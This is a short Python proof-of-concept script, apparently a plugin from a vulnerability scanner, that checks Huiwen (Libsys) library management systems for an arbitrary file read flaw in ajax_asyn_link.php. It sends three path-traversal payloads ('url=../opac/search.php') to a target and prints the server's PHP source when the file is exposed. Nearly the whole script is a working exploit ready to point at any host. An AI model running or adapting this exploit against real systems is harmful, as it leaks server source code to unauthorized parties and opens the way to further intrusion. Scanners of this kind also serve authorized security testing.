#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_asyn_link.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2010-067400
author: Lucifer
description: 漏洞影响3.5,4.0,5.0版本,漏洞文件位于ajax_asyn_link.php中,参数url可以传入"../"来读取PHP文件。
'''
import sys
import requests
import warnings
from termcolor import cprint

class libsys_ajax_asyn_link_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        try:
            noexist = True
            for payload in [r"/zplug/ajax_asyn_link.php?url=../opac/search.php",
                            r"/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
                            r"/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]:
                vulnurl = self.url + payload

                req = requests.get(vulnurl, timeout=10, verify=False)
                if r"<?php" in req.text:
                    cprint("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
                    return True, vulnurl, "汇文软件图书管理系统ajax_asyn_link.php任意文件读取", payload, req.text
            if noexist:
                cprint("[-]不存在libsys_ajax_asyn_link_fileread漏洞", "white", "on_grey")
                return False, None, None, None, None
        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = libsys_ajax_asyn_link_fileread_BaseVerify(sys.argv[1])
    testVuln.run()